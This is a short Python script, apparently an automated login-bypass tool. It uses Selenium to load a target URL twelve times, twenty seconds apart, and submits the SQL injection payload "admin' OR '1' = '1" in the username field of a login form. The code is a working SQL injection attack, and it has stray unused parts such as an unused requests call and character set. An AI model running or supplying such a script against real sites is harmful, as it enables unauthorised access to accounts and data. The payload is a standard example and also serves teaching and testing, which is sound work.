import requests
from selenium import webdriver
import string
import random
from bs4 import BeautifulSoup
import time

url = '...' # <--- enter the target url
page = requests.get(url)
# Create a BeautifulSoup object from the response
driver = webdriver.Firefox('geckodriver/')
all_ascii = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation

for i in range(12):
    time.sleep(20)
    driver.get(url)
    # Set Credentials
    sql_injection = "admin' OR '1' = '1"
    driver.find_element_by_id("username").send_keys(sql_injection)
    driver.find_element_by_xpath("/html/body/section/form/ul/li[3]/input[2]").click()
